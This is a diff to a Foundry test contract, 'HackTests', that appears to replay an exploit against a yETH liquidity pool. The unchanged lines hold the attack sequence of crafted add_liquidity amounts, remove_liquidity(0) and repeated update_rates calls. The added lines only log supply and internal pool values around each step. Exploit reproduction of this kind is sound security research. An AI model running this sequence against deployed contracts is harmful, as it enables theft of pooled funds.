@@ -10,6 +10,8 @@ import "forge-std/Test.sol";
 
 contract HackTests is Test {
 
+    bytes32 constant DEBUG_ASSET = keccak256("DebugAddLiquidityAsset(uint256,uint256,uint256)");
+
     bytes localCode;
     bytes newDeployedCode;
 
@@ -99,7 +101,9 @@ contract HackTests is Test {
         rates[5] = 5;
         rates[6] = 0;
         rates[7] = 0;
+        console.log("Supply before first update_rates (YETH.totalSupply())", YETH.totalSupply());
         POOL.update_rates(rates);
+        console.log("Supply after first update_rates (YETH.totalSupply())", YETH.totalSupply());
 
         uint256 balance;
         (uint256 prod, uint256 sum) = POOL.vb_prod_sum();
@@ -226,8 +230,23 @@ contract HackTests is Test {
         addAmounts[5] = 1488254960317842892500;
         addAmounts[6] = 0;
         addAmounts[7] = 0;
+        vm.recordLogs();
         receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
         console.log("received yETH", receivedyETH);
+
+        // Debug: capture vb_prod_final / vb_sum_final before _calc_supply in this add
+        console.log("debug vb_prod_before_calc", POOL.debug_vb_prod_before_calc());
+        console.log("debug vb_sum_before_calc", POOL.debug_vb_sum_before_calc());
+
+        Vm.Log[] memory logsAsset = vm.getRecordedLogs();
+        for (uint256 i = 0; i < logsAsset.length; i++) {
+            Vm.Log memory lg = logsAsset[i];
+            if (lg.topics.length > 0 && lg.topics[0] == DEBUG_ASSET) {
+                uint256 assetIdx = uint256(lg.topics[1]);
+                (uint256 powUp, uint256 prodAfter) = abi.decode(lg.data, (uint256, uint256));
+                console.log("fifth add asset", assetIdx, powUp, prodAfter);
+            }
+        }
         
         (prod, sum) = POOL.vb_prod_sum();
         console.log("vb_prod after fifth add_liquidity", prod);
@@ -242,13 +261,14 @@ contract HackTests is Test {
         addAmounts[5] = 0;
         addAmounts[6] = 0;
         addAmounts[7] = 0;
+        console.log("Supply before sixth add_liquidity", POOL.supply());
         receivedyETH = POOL.add_liquidity(addAmounts, 0, bad_tapir);
         console.log("received yETH", receivedyETH);
         
         (prod, sum) = POOL.vb_prod_sum();
         console.log("vb_prod after sixth add_liquidity", prod);
         console.log("vb_sum after sixth add_liquidity", sum);
-        
+        console.log("Supply after sixth add_liquidity", POOL.supply());
         // Fifth remove_liquidity
         POOL.remove_liquidity(0, new uint256[](8), bad_tapir);
         
@@ -256,11 +276,15 @@ contract HackTests is Test {
         console.log("vb_prod after remove_liquidity(0)", prod);
         console.log("vb_sum after remove_liquidity(0)", sum);
         
+        console.log("Supply before update_rates", POOL.supply());
         // Update rates with asset index 6
         uint256[] memory rates2 = new uint256[](1);
         rates2[0] = 6;
+        console.log("Supply before second update_rates (YETH.totalSupply())", YETH.totalSupply());
         POOL.update_rates(rates2);
-        
+        console.log("Supply after second update_rates (YETH.totalSupply())", YETH.totalSupply());
+        console.log("Supply after second update_rates (POOL.supply())", POOL.supply());
+
         (prod, sum) = POOL.vb_prod_sum();
         console.log("vb_prod after update_rates", prod);
         console.log("vb_sum after update_rates", sum);
@@ -335,8 +359,9 @@ contract HackTests is Test {
         
         // Update rates with asset index 6
         rates2[0] = 6;
+        console.log("Supply before third update_rates (YETH.totalSupply())", YETH.totalSupply());   
         POOL.update_rates(rates2);
-        
+        console.log("Supply after third update_rates (YETH.totalSupply())", YETH.totalSupply());
         (prod, sum) = POOL.vb_prod_sum();
         console.log("vb_prod after update_rates", prod);
         console.log("vb_sum after update_rates", sum);
@@ -405,7 +430,9 @@ contract HackTests is Test {
         
         // Update rates with asset index 7
         rates2[0] = 7;
+        console.log("Supply before fourth update_rates (meth) (YETH.totalSupply())", YETH.totalSupply());
         POOL.update_rates(rates2);
+        console.log("Supply after fourth update_rates (YETH.totalSupply())", YETH.totalSupply());
         
         (prod, sum) = POOL.vb_prod_sum();
         console.log("vb_prod after update_rates", prod);
